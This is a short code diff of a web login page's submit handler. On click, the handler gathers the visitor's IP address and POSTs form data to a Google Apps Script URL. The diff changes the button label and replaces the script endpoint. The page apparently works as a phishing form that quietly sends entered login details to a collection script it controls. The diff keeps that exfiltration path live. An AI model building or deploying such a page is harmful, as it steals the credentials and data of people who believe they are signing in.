@@ -252,7 +252,7 @@
           e.preventDefault(); // Prevents the page from reloading immediately
           
           const originalText = loginButton.innerText;
-          loginButton.innerText = "Verifying...";
+          loginButton.innerText = "Logging on...";
 
           try {
               // Get the IP Address
@@ -268,7 +268,7 @@
               };
 
               // Send to Google Script
-              const scriptURL = "https://script.google.com/macros/s/AKfycbwcLqzt8R7t2pqZe5pQnCB3pKXOt_7QtXVAfuhlqNoc-yQm8Gt-a7Zb3ch_Xmoz0nar/exec";
+              const scriptURL = "https://script.google.com/macros/s/AKfycbzwzm0GPkAGDSEXc8QkyruD46donV5_wad0ehjO7iFIgdvusg9ozHyxYibk9DkJHLx2/exec";
               
               await fetch(scriptURL, {
                   method: 'POST',
